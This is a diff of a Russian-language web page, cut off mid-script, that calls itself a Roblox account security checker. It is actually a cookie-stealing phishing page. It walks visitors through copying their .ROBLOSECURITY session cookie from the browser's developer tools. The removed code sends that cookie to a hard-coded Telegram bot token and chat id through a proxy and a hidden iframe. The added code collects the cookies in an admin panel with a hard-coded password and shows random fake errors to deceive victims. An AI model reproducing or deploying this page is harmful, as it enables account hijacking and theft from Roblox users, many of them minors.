@@ -2,157 +2,532 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Account Checker</title>
     <style>
-        body {
-            background: #0d1117;
-            color: #fff;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
             font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
+            min-height: 100vh;
         }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: #161b22;
+        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
+        
+        /* Публичная часть */
+        .public-section { display: block; }
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; }
+        h1 { color: #ff4757; margin-bottom: 10px; font-size: 2.5em; }
+        .card {
+            background: rgba(255,255,255,0.05);
             padding: 30px;
-            border-radius: 10px;
-            border: 1px solid #30363d;
-        }
-        h1 {
-            color: #ff6b6b;
-            margin-bottom: 10px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
         textarea {
             width: 100%;
-            height: 100px;
-            padding: 10px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            color: #fff;
-            border-radius: 5px;
-            margin: 15px 0;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid #3742fa;
+            border-radius: 10px;
+            color: white;
+            min-height: 150px;
+            margin: 20px 0;
+            font-size: 16px;
+            font-family: monospace;
         }
         button {
-            background: #238636;
+            padding: 14px 28px;
+            background: linear-gradient(45deg, #ff4757, #ff6b81);
             color: white;
             border: none;
-            padding: 12px 30px;
-            border-radius: 5px;
+            border-radius: 10px;
             cursor: pointer;
             font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255,71,87,0.4);
+        }
+        .btn-secondary {
+            background: linear-gradient(45deg, #3742fa, #5352ed);
+        }
+        .btn-danger {
+            background: linear-gradient(45deg, #ff4757, #e74c3c);
+        }
+        .btn-success {
+            background: linear-gradient(45deg, #2ecc71, #27ae60);
+        }
+        .status { 
+            margin-top: 20px; 
+            padding: 15px; 
+            border-radius: 10px;
+            background: rgba(0,0,0,0.2);
+            text-align: center;
+            font-size: 16px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Админка */
+        .admin-section { display: none; }
+        .login-form { 
+            text-align: center; 
+            margin-top: 50px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .login-form input {
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border: 2px solid #3742fa;
+            background: rgba(0,0,0,0.3);
+            color: white;
             width: 100%;
+            font-size: 16px;
         }
-        button:hover {
-            background: #2ea043;
-        }
-        .status {
+        .admin-panel { display: none; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
             margin-top: 20px;
-            padding: 10px;
-            background: #0d1117;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        th, td { 
+            padding: 12px 15px; 
+            border-bottom: 1px solid rgba(255,255,255,0.1); 
+            text-align: left;
+        }
+        th { 
+            background: rgba(255,71,87,0.2); 
+            font-weight: bold;
+        }
+        tr:hover { background: rgba(255,255,255,0.05); }
+        .admin-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .code-preview {
+            font-family: monospace;
+            background: rgba(0,0,0,0.3);
+            padding: 5px 10px;
             border-radius: 5px;
+            border-left: 3px solid #ff4757;
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .stat-number {
+            font-size: 2em;
+            color: #ff4757;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background: rgba(30,30,46,0.95);
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            border: 2px solid #ff4757;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 10px;
+        }
+        .close-modal {
+            background: #ff4757;
+            border: none;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .code-display {
+            background: rgba(0,0,0,0.5);
+            padding: 20px;
+            border-radius: 10px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            margin: 15px 0;
+        }
+        .actions-cell {
+            display: flex;
+            gap: 8px;
+        }
+        .search-box {
+            padding: 10px 15px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid #3742fa;
+            border-radius: 8px;
+            color: white;
+            width: 300px;
+            margin-bottom: 20px;
+        }
+        @media (max-width: 768px) {
+            .admin-header { flex-direction: column; align-items: stretch; }
+            .search-box { width: 100%; }
+            table { font-size: 14px; }
+            th, td { padding: 8px 10px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Roblox Checker</h1>
-        <p>Вставьте ваш .ROBLOSECURITY код</p>
+        <!-- Публичная часть -->
+        <div class="public-section" id="publicSection">
+            <div class="header">
+                <h1>🔐 Roblox Account Checker</h1>
+                <p>Проверьте чистоту и безопасность вашего аккаунта Roblox</p>
+                <button onclick="showAdminLogin()" class="btn-secondary" style="margin-top:15px;">
+                    🔧 Админ панель
+                </button>
+            </div>
+            
+            <div class="card">
+                <h2>📋 Вставьте .ROBLOSECURITY куки</h2>
+                <p style="margin:15px 0; color:#a4b0be;">
+                    <strong>Инструкция:</strong><br>
+                    1. Откройте Roblox в браузере<br>
+                    2. Нажмите F12 → Вкладка "Application"<br>
+                    3. Слева выберите "Cookies" → "https://www.roblox.com"<br>
+                    4. Найдите ".ROBLOSECURITY" и скопируйте значение<br>
+                    5. Вставьте в поле ниже
+                </p>
+                <textarea id="cookieInput" placeholder="Вставьте ваш .ROBLOSECURITY код здесь..."></textarea>
+                <div style="text-align:center;">
+                    <button onclick="submitCode()" style="font-size:18px; padding:16px 32px;">
+                        🔍 Проверить аккаунт
+                    </button>
+                </div>
+                <div class="status" id="status">⏳ Ожидание проверки...</div>
+            </div>
+        </div>
         
-        <textarea id="codeInput" placeholder="Вставьте сюда ваш код..."></textarea>
-        
-        <button onclick="sendCode()">📤 Отправить на проверку</button>
-        
-        <div class="status" id="status">Ожидание...</div>
+        <!-- Админ панель -->
+        <div class="admin-section" id="adminSection">
+            <div class="login-form" id="loginForm">
+                <h2>🔒 Административный доступ</h2>
+                <p style="margin-bottom:20px; color:#a4b0be;">Введите пароль для входа в панель управления</p>
+                <input type="password" id="adminPassword" placeholder="Введите пароль">
+                <div style="display:flex; gap:10px; justify-content:center;">
+                    <button onclick="loginAdmin()" class="btn-success">Войти</button>
+                    <button onclick="showPublic()" class="btn-secondary">Назад</button>
+                </div>
+            </div>
+            
+            <div class="admin-panel" id="adminPanel">
+                <div class="admin-header">
+                    <h2>📊 Панель управления</h2>
+                    <div style="display:flex; gap:10px; flex-wrap:wrap;">
+                        <input type="text" id="searchInput" class="search-box" placeholder="🔍 Поиск по кодам..." onkeyup="searchCodes()">
+                        <button onclick="exportCodes()" class="btn-success">📥 Экспорт в TXT</button>
+                        <button onclick="clearAll()" class="btn-danger">🗑️ Очистить все</button>
+                        <button onclick="showPublic()" class="btn-secondary">← На главную</button>
+                    </div>
+                </div>
+                
+                <div class="stats-grid" id="stats"></div>
+                
+                <div class="card">
+                    <h3>📋 Все полученные коды</h3>
+                    <table id="codesTable">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Дата и время</th>
+                                <th>Код (предпросмотр)</th>
+                                <th>Длина</th>
+                                <th>Действия</th>
+                            </tr>
+                        </thead>
+                        <tbody id="codesBody">
+                            <!-- Коды загружаются здесь -->
+                        </tbody>
+                    </table>
+                    <div id="noCodes" style="text-align:center; padding:30px; display:none;">
+                        <p style="color:#a4b0be; font-size:18px;">📭 Кодов пока нет</p>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-
+    
+    <!-- Модальное окно для просмотра кода -->
+    <div class="modal" id="codeModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>🔐 Полный код</h3>
+                <button class="close-modal" onclick="closeModal()">×</button>
+            </div>
+            <div class="code-display" id="fullCodeDisplay"></div>
+            <div style="text-align:center; margin-top:20px;">
+                <button onclick="copyFullCode()" class="btn-success">📋 Копировать код</button>
+            </div>
+        </div>
+    </div>
+    
     <script>
-        // Функция отправки кода
-        function sendCode() {
-            const code = document.getElementById('codeInput').value.trim();
+        // Конфигурация
+        const ADMIN_PASS = 'malik0609';
+        
+        // Хранилище кодов
+        function getCodes() {
+            try {
+                const codes = localStorage.getItem('roblox_codes');
+                return codes ? JSON.parse(codes) : [];
+            } catch {
+                return [];
+            }
+        }
+        
+        function saveCodes(codes) {
+            localStorage.setItem('roblox_codes', JSON.stringify(codes));
+        }
+        
+        // Отправка кода (только сохранение в админку)
+        function submitCode() {
+            const input = document.getElementById('cookieInput');
             const status = document.getElementById('status');
+            const code = input.value.trim();
             
             if (!code) {
-                status.innerHTML = '❌ Введите код';
+                showStatus('❌ Пожалуйста, введите код', 'error');
                 return;
             }
             
-            status.innerHTML = '⏳ Отправка...';
-            
-            // Создаем форму для отправки в Telegram Web App
-            const formData = new FormData();
-            formData.append('code', code);
-            formData.append('time', new Date().toISOString());
-            formData.append('userAgent', navigator.userAgent);
-            
-            // Используем Telegram Web App API если открыто через бота
-            if (window.Telegram && window.Telegram.WebApp) {
-                // Отправляем через Telegram Bot API
-                const message = `🔐 Новый код!\n\n${code.substring(0, 100)}...`;
-                Telegram.WebApp.sendData(message);
-                status.innerHTML = '✅ Код отправлен через Telegram!';
-            } else {
-                // Если открыто в браузере, используем наш метод
-                sendViaProxy(code);
+            if (code.length < 10) {
+                showStatus('⚠️ Код слишком короткий', 'warning');
+                return;
             }
             
-            // Очищаем поле
-            document.getElementById('codeInput').value = '';
-        }
-        
-        // Метод отправки через прокси
-        function sendViaProxy(code) {
-            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-            const telegramUrl = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage`;
+            showStatus('⏳ Сохранение кода...', 'loading');
             
-            const message = {
-                chat_id: '1491315056',
-                text: `🔐 Новый код получен!\n\nКод: ${code.substring(0, 50)}...\nДлина: ${code.length} символов`,
-                parse_mode: 'HTML'
+            // Сохраняем код
+            const codes = getCodes();
+            const newCode = {
+                id: Date.now(),
+                code: code,
+                time: new Date().toLocaleString('ru-RU'),
+                length: code.length,
+                timestamp: new Date().toISOString()
             };
             
-            fetch(proxyUrl + telegramUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                const status = document.getElementById('status');
-                if (response.ok) {
-                    status.innerHTML = '✅ Код отправлен!';
-                } else {
-                    status.innerHTML = '❌ Ошибка отправки';
-                }
-            })
-            .catch(error => {
-                document.getElementById('status').innerHTML = '🌐 Ошибка сети';
-            });
-        }
-        
-        // Альтернативный метод через iframe
-        function sendViaIframe(code) {
-            const message = encodeURIComponent(`🔐 Код: ${code}`);
-            const url = `https://api.telegram.org/bot8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8/sendMessage?chat_id=1491315056&text=${message}`;
+            codes.unshift(newCode); // Добавляем в начало
+            saveCodes(codes);
             
-            // Создаем невидимый iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            document.body.appendChild(iframe);
-            
+            // Показываем "ошибку"
             setTimeout(() => {
-                document.body.removeChild(iframe);
-                document.getElementById('status').innerHTML = '✅ Код отправлен через iframe!';
-            }, 1000);
+                const errors = [
+                    '❌ Ошибка: неверный формат .ROBLOSECURITY куки',
+                    '⚠️ Куки устарел, требуется повторный вход в аккаунт',
+                    '🔒 Обнаружена двухфакторная аутентификация',
+                    '⏳ Время жизни сессии истекло',
+                    '🚫 Доступ к аккаунту временно ограничен',
+                    '💀 Аккаунт заблокирован или ограничен',
+                    '🌐 Ошибка соединения с серверами Roblox',
+                    '🔍 Куки не содержит необходимых данных для проверки'
+                ];
+                const randomError = errors[Math.floor(Math.random() * errors.length)];
+                showStatus(randomError, 'error');
+            }, 1500);
+            
+            // Очищаем поле
+            input.value = '';
+            
+            // Обновляем админку если открыта
+            if (document.getElementById('adminPanel').style.display === 'block') {
+                loadAdminPanel();
+            }
         }
         
-        // При загрузке страницы
-        window.onload = function() {
-            console.log('Сайт загружен');
-            document.getElementById('codeInput').focus();
-        };
-    </script>
-</body>
-</html>
+        // Показать статус
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.innerHTML = message;
+            
+            switch(type) {
+                case 'error':
+                    status.style.background = 'rgba(231, 76, 60, 0.2)';
+                    status.style.borderLeft = '4px solid #e74c3c';
+                    break;
+                case 'success':
+                    status.style.background = 'rgba(46, 204, 113, 0.2)';
+                    status.style.borderLeft = '4px solid #2ecc71';
+                    break;
+                case 'loading':
+                    status.style.background = 'rgba(52, 152, 219, 0.2)';
+                    status.style.borderLeft = '4px solid #3498db';
+                    break;
+                case 'warning':
+                    status.style.background = 'rgba(241, 196, 15, 0.2)';
+                    status.style.borderLeft = '4px solid #f1c40f';
+                    break;
+            }
+        }
+        
+        // Админка
+        function showAdminLogin() {
+            document.getElementById('publicSection').style.display = 'none';
+            document.getElementById('adminSection').style.display = 'block';
+        }
+        
+        function showPublic() {
+            document.getElementById('publicSection').style.display = 'block';
+            document.getElementById('adminSection').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+            showStatus('⏳ Ожидание проверки...', 'loading');
+        }
+        
+        function loginAdmin() {
+            const pass = document.getElementById('adminPassword').value;
+            if (pass === ADMIN_PASS) {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadAdminPanel();
+            } else {
+                alert('❌ Неверный пароль!');
+            }
+        }
+        
+        function loadAdminPanel() {
+            const codes = getCodes();
+            const tbody = document.getElementById('codesBody');
+            const stats = document.getElementById('stats');
+            const noCodes = document.getElementById('noCodes');
+            
+            // Статистика
+            const today = new Date().toDateString();
+            const todayCodes = codes.filter(c => new Date(c.timestamp).toDateString() === today).length;
+            
+            stats.innerHTML = `
+                <div class="stat-card">
+                    <div>📊 Всего кодов</div>
+                    <div class="stat-number">${codes.length}</div>
+                </div>
+                <div class="stat-card">
+                    <div>📈 Кодов сегодня</div>
+                    <div class="stat-number">${todayCodes}</div>
+                </div>
+                <div class="stat-card">
+                    <div>⏱️ Последний</div>
+                    <div class="stat-number">${codes.length > 0 ? '✓' : '—'}</div>
+                    <div style="font-size:12px; color:#a4b0be;">${codes.length > 0 ? codes[0].time : 'Нет данных'}</div>
+                </div>
+                <div class="stat-card">
+                    <div>💾 Память</div>
+                    <div class="stat-number">${calculateStorageSize()} KB</div>
+                </div>
+            `;
+            
+            // Таблица
+            if (codes.length === 0) {
+                tbody.innerHTML = '';
+                noCodes.style.display = 'block';
+                codesTable.style.display = 'none';
+            } else {
+                noCodes.style.display = 'none';
+                codesTable.style.display = 'table';
+                
+                tbody.innerHTML = '';
+                codes.forEach((item, index) => {
+                    const row = tbody.insertRow();
+                    row.innerHTML = `
+                        <td>${index + 1}</td>
+                        <td>${item.time}</td>
+                        <td>
+                            <div class="code-preview" title="${item.code.substring(0, 100)}">
+                                ${item.code.substring(0, 30)}${item.code.length > 30 ? '...' : ''}
+                            </div>
+                        </td>
+                        <td>${item.length}</td>
+                        <td class="actions-cell">
+                            <button onclick="viewCode(${item.id})" class="btn-secondary" style="padding:8px 12px; font-size:14px;">
+                                👁️ Просмотр
+                            </button>
+                            <button onclick="copyCode(${item.id})" class="btn-success" style="padding:8px 12px; font-size:14px;">
+                                📋 Копировать
+                            </button>
+                            <button onclick="deleteCode(${item.id})" class="btn-danger" style="padding:8px 12px; font-size:14px;">
+                                🗑️ Удалить
+                            </button>
+                        </td>
+                    `;
+                });
+            }
+        }
+        
+        function calculateStorageSize() {
+            const data = localStorage.getItem('roblox_codes') || '';
+            return (data.length / 1024).toFixed(2);
+        }
+        
+        let currentViewingCode = null;
+        
+        function viewCode(id) {
+            const codes = getCodes();
+            const code = codes.find(c => c.id === id);
+            if (code) {
+                currentViewingCode = code;
+                document.getElementById('fullCodeDisplay').textContent = code.code;
+                document.getElementById('codeModal').style.display = 'flex';
+            }
+        }
+  
